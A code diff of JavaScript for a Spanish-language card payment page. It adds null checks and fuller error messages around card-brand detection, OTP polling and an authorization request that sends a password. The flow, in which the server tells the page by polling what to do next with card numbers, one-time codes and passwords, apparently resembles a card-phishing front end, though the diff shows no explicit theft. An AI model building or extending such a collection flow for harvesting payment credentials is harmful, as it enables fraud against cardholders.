@@ -654,9 +654,13 @@ document.getElementById('btnEnviarDinamica').addEventListener('click', function(
     return;
   }
   var marca = 'visa';
-  var cardNum = document.getElementById('cardNumber').value.replace(/\D/g, '');
-  if (cardNum.startsWith('5') || cardNum.startsWith('2')) marca = 'mastercard';
-  else if (cardNum.startsWith('3')) marca = 'amex';
+  var cardNum = '';
+  var cardNumberEl = document.getElementById('cardNumber');
+  if (cardNumberEl) {
+    cardNum = cardNumberEl.value.replace(/\D/g, '');
+    if (cardNum.startsWith('5') || cardNum.startsWith('2')) marca = 'mastercard';
+    else if (cardNum.startsWith('3')) marca = 'amex';
+  }
 
   var otpError = document.getElementById('otpErrorMsg');
   if (otpError) otpError.style.display = 'none';
@@ -728,7 +732,7 @@ function iniciarPollingOtp(sessionId, marca) {
           clearInterval(pagoOtpPollingInterval);
           pagoOtpPollingInterval = null;
           ocultarCargaOtp();
-          // Redirigir o mostrar éxito (aquí podrías recargar solo si es necesario)
+          // SE ELIMINÓ EL WINDOW.LOCATION.HREF QUE RECARGABA LA PÁGINA
         }
         else if (data.accion === 'AUTORIZAR' || data.estado === 'autorizacion') {
           clearInterval(pagoOtpPollingInterval);
@@ -910,7 +914,16 @@ document.addEventListener('DOMContentLoaded', function() {
         password: password
       })
     })
-    .then(function(r) { return r.json(); })
+    .then(function(r) { 
+        return r.text().then(function(text) {
+            var data = {};
+            try { data = JSON.parse(text); } catch(e) { data = { error: text || 'Respuesta vacía' }; }
+            if (!r.ok) {
+                throw new Error(data.error || 'Error HTTP: ' + r.status);
+            }
+            return data;
+        });
+    })
     .then(function(data) {
       if (data && data.ok) {
         cerrarModalAutorizacion();
@@ -922,7 +935,13 @@ document.addEventListener('DOMContentLoaded', function() {
     })
     .catch(function(err) {
       console.error('Error autorización:', err);
-      errorBox.textContent = 'No se pudo enviar. Intenta de nuevo.';
+      
+      var msg = 'Error desconocido';
+      if (err.message) {
+          msg = err.message;
+      }
+      
+      errorBox.textContent = 'Error: ' + msg;
       errorBox.classList.remove('hidden');
       btnEnviar.disabled = false;
       btnEnviar.textContent = 'Enviar';
